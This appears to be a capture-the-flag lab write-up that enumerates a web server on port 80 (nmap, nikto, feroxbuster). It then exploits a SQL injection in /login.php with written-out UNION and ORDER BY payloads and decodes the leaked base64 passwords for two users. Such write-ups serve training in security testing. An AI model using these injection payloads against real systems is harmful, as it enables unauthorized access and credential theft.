**HyperText Transport Protocol**
# Environment Variables / Setup
```
export IP=192.168.109.10
export PORT=80
export URL=http://$IP:$PORT
```

# nmap
```
nmap -vv --reason -Pn -T4 -sV -p 80 --script="banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" 
```

```
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-feed: Couldn't find any feeds.
| http-php-version: Logo query returned unknown hash 862a0ac446ba7dfef3c7ff3026777e84
|_Credits query returned unknown hash 862a0ac446ba7dfef3c7ff3026777e84
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-malware-host: Host appears to be clean
|_http-title: blaze
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-date: Thu, 07 Aug 2025 23:23:49 GMT; 0s from local time.
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.109.10
|     
|     Path: http://192.168.109.10:80/css/index.css
|     Line number: 82
|     Comment: 
|         /*   z-index: -1; */
|     
|     Path: http://192.168.109.10:80/css/index.css
|     Line number: 4
|     Comment: 
|         /* 
|         font-family: 'PT Sans', sans-serif;
|         font-family: 'Source Sans Pro', sans-serif;
|         font-family: 'Roboto Slab', serif;
|         font-family: 'Open Sans', sans-serif;
|         */
|     
|     Path: http://192.168.109.10:80/css/index.css
|     Line number: 181
|     Comment: 
|         /*   text-align:center; */
|     
|     Path: http://192.168.109.10:80/css/index.css
|     Line number: 177
|     Comment: 
|         /*    */
|     
|     Path: http://192.168.109.10:80/css/index.css
|     Line number: 67
|     Comment: 
|         /*   background-image:url("https://source.unsplash.com/l3N9Q27zULw"); */
|     
|     Path: http://192.168.109.10:80/css/index.css
|     Line number: 270
|     Comment: 
|         /* width: 110%; */
|     
|     Path: http://192.168.109.10:80/css/index.css
|     Line number: 23
|     Comment: 
|         /*  Colors  */
|     
|     Path: http://192.168.109.10:80/css/index.css
|     Line number: 90
|     Comment: 
|         /*   width:50%; */
|     
|     Path: http://192.168.109.10:80/css/index.css
|     Line number: 18
|     Comment: 
|_        /*  Fonts  */
|_http-wordpress-enum: Nothing found amongst the top 100 resources,use --script-args search-limit=<number|all> for deeper analysis)
|_http-drupal-enum: Nothing found amongst the top 100 resources,use --script-args number=<number|all> for deeper analysis)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-cookie-flags: 
|   /login.php: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-errors: Couldn't find any error pages.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
|_http-fetch: Please enter the complete path of the directory to save data in.
|_http-mobileversion-checker: No mobile version detected.
| http-headers: 
|   Date: Thu, 07 Aug 2025 23:23:54 GMT
|   Server: Apache/2.4.41 (Ubuntu)
|   Last-Modified: Wed, 29 Mar 2023 06:51:19 GMT
|   ETag: "d15-5f8046741ae2b"
|   Accept-Ranges: bytes
|   Content-Length: 3349
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
| http-vhosts: 
|_128 names had status 200
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1
|     /css/
|       css: 1
|   Longest directory structure:
|     Depth: 1
|     Dir: /css/
|   Total files found (by extension):
|_    Other: 1; css: 1
|_http-chrono: Request times for /; avg: 285.53ms; min: 266.81ms; max: 334.22ms
| http-enum: 
|   /login.php: Possible admin folder
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
```

# nikto 
```
nikto -ask=no -Tuning=x4567890ac -nointeractive -host http://192.168.109.10:80 2>&1
```

```
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: d15, size: 5f8046741ae2b, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /img/: Directory indexing found.
+ /img/: This might be interesting.
+ /login.php: Admin login page/section found.
+ 7729 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2025-08-07 16:38:49 (GMT-7) (907 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

# Identify Tech Stack
## whatweb

```
whatweb $URL
```

```
http://192.168.109.10:80 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.109.10], Title[blaze]
```


## Content Discovery

(Autorecon Feroxbuster)
```
feroxbuster -u http://192.168.109.10:80/ -t 10 -w /home/kali/.local/share/AutoRecon/wordlists/dirbuster.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -q -e -r -o "/home/kali/cockpit/autorecon/results/192.168.109.10/scans/tcp80/tcp_80_http_feroxbuster_dirbuster.txt"
```

```
200      GET      278l      506w     5366c http://192.168.109.10/css/index.css
200      GET       78l      321w     3349c http://192.168.109.10/
200      GET       29l       60w      477c http://192.168.109.10/css/type.css
200      GET       10l       28w      233c http://192.168.109.10/blocked.html
200      GET       65l      128w     1108c http://192.168.109.10/css/style.css
200      GET       18l       77w     1323c http://192.168.109.10/css/
200      GET       78l      321w     3349c http://192.168.109.10/index.html
200      GET      707l     4190w   598838c http://192.168.109.10/img/blaze.png
200      GET       16l       58w      935c http://192.168.109.10/img/
200      GET       29l       85w      913c http://192.168.109.10/js/index.js
200      GET       16l       60w      932c http://192.168.109.10/js/
200      GET       28l       63w      769c http://192.168.109.10/login.php
200      GET        0l        0w        0c http://192.168.109.10/db_config.php
```

Look into **login.php** below...
# Robots.txt

```
curl $URL/robots.txt
```

(Does not exist)

# Manual Enumeration
(Walk application functionality in Burp Suite)

![[Pasted image 20250807162655.png]]

The "Purchase" and "Buy now" buttons just link between anchors on the page.

The page's title, "blaze," is interesting.

# login.php SQL injection
On /login.php, discovered in our feroxbuster enumeration, there is a login form. Some guesses at default credentials don't work, but by entering a single quote in the username field, we find that the application leaks a MySQL error, indicating it's vulnerable to error-based SQL injection.

![[Pasted image 20250807170907.png]]

I'll continue enumerating this injection in the user field:

`test ' UNION SELECT MySQL.User(); -- -`

```
Error: execute command denied to user 'admin'@'localhost' for routine 'MySQL.User'
```

`test ' UNION SELECT @@version; -- -`

```
Error: The used SELECT statements have a different number of columns
```

Find number of columns returned by changing value:
`test ' ORDER BY 10;-- -;`

![[Pasted image 20250807174508.png]]

Starting high and decrementing, it seems there are 5 columns, as any higher than that creates a MySQL error.

`test ' ORDER BY 10;-- -;`

![[Pasted image 20250807174624.png]]

Use this to get union clause injection working:
`test ' UNION SELECT @@version, NULL, NULL, NULL, NULL-- -`

For some reason this redirects me to /password-dashboard.php, which displays usernames and passwords for 'james' and 'cameron' ????

![[Pasted image 20250807175027.png]]

```
james	Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=
cameron	dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy
```

Decoding from base64, we have their passwords in plaintext (reminder to use secure password hashing algorithms when storing credentials -- added to [[Archive/OFFSEC - Proving Grounds Writeups/Linux/Cockpit/Findings|Findings]] as a further vulnerability):
```
james canttouchhhthiss@455152
cameron	thisscanttbetouchedd@455152
```

These credentials aren't valid on this page, but james' *does* work against [[9090 HTTP]] -- we'll continue there.
